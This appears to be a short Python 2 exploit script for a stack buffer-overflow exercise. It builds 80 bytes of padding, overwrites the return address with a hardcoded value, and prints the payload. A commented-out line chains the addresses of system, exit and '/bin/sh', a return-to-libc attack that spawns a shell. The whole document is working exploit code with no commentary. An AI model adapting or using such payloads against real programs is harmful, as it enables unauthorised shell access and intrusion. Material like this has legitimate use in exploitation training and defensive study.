import struct

eip = struct.pack("I", 0x0804853e)

sys = struct.pack("I", 0xb7e6b060)
ex = struct.pack("I", 0xb7e5ebe0)
sh = struct.pack("I", 0xb7f8cc58)

padding =""
ch = "A"
while (ch <= "T"):
    padding += ch*4
    ch = chr(ord(ch) + 1)

print(padding+eip+"AAAA"+"BBBB"+"CCCC")

#print(padding+eip+sys+ex+sh)
